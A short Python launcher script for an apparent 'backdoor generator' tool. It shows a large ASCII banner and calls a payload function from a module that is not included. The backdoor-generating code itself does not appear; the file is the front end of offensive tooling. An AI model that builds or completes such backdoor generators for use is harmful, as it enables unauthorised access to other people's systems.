#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Gr3n0xX
# Python backdoor generator 
try:
    import sys
    import os
    import time
    from payloads.pythonpayload import pyload
    from src.loanding import load
    from colorama import Fore, Back, Style
    
except ModuleNotFoundError:
    print(Fore.RED + '[!] I require colorama, install it')
    sys.exit()
except KeyboardInterrupt:
    print(Fore.RED + '[!] Exiting.')
    sys.exit()
if sys.version_info[0] < 3:
    print("\033[1m\033[93m[!] Please run the tool using Python 3")
    sys.exit()


    
def banner():
    os.system("clear")
    print (Fore.BLUE + """

           _________
         /'        /|
        /         / |_
       /         /  //|
      /_________/  ////|
     |   _ _    | 8o////|
     | /'// )_  |   8///|
     |/ // // ) |   8o///|
     / // // //,|  /  8//|
    / // // /// | /   8//|
   / // // ///__|/    8//|
  /.(_)// /// |       8///|
 (_)' `(_)//| |       8////|___________
(_) /_\ (_)'| |        8///////////////
(_) \_/ (_)'|_|         8/////////////
 (_)._.(_) d' Hb         8oooooooopb'
   `(_)'  d'  H`b       -------------------
         d'   `b`b      |    BACKDOOR     |
        d'     H `b     |    Generator    |
       d'      `b `b    |     AUTHOR:     |
      d'           `b   |    Gr3n0xX      |
     d'             `b  |                 |
                        -------------------

Visit https://github.com/grenoxx For More Tools:""")


    
    
banner()
pyload()
load()
os.system("clear")
print ("[*] Finish!!!")
